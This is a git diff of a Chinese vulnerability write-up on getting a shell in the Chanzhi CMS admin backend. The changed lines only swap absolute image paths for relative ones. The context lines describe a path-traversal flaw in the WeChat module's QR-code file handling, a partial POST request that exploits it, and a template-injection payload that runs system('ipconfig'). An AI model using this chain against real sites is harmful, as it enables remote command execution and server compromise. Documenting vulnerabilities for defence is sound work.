@@ -12,15 +12,15 @@
 
 后台存在模板编辑，但是如果保存的话需要创建一个/system\\tmp\\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId24.png)
+![](./.resource/禅知后台getshell/media/rId24.png)
 
 在/system/module/wechat/model.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId25.png)
+![](./.resource/禅知后台getshell/media/rId25.png)
 
 \$qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId26.png)
+![](./.resource/禅知后台getshell/media/rId26.png)
 
     POST /chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 HTTP/1.1
     Host: 0-sec.org
@@ -41,14 +41,14 @@
 
 点一下二维码，再随便传一张图片，可以看到创建了一个xjrg.txt文件夹
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId27.png)
+![](./.resource/禅知后台getshell/media/rId27.png)
 
 现在我们再去编辑模板，{!echo(system(\'ipconfig\'))},可以直接写入一句话
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId28.png)
+![](./.resource/禅知后台getshell/media/rId28.png)
 
 然后在访问前台
 
 http:/0-sec.org/chanzhieps/www/index.php/sitemap/
 
-![](/Users/aresx/Documents/VulWiki/.resource/禅知后台getshell/media/rId29.png)
+![](./.resource/禅知后台getshell/media/rId29.png)
